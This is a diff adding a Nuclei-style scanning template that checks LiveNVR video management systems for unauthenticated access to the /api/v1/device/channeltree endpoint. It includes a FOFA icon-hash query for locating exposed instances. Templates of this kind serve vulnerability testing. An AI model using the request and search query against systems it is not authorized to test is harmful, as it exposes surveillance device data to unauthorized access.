@@ -1,0 +1,23 @@
+id: LiveNVR-channeltree-unauthorized
+
+info:
+  name: livenvr 青柿视频管理系统 channeltree 未授权访问
+  author: Huanxiong
+  severity: high
+  metadata:
+    fofa-query: icon_hash="-206100324" 
+
+  tags: Unauthorized
+
+http:
+  - raw:
+      - |
+        GET /api/v1/device/channeltree?serial=&pcode HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        name: 未授权访问
+        dsl:
+          - "status_code==200 && contains_all(body,'custom','serial','id','manufacturer')"
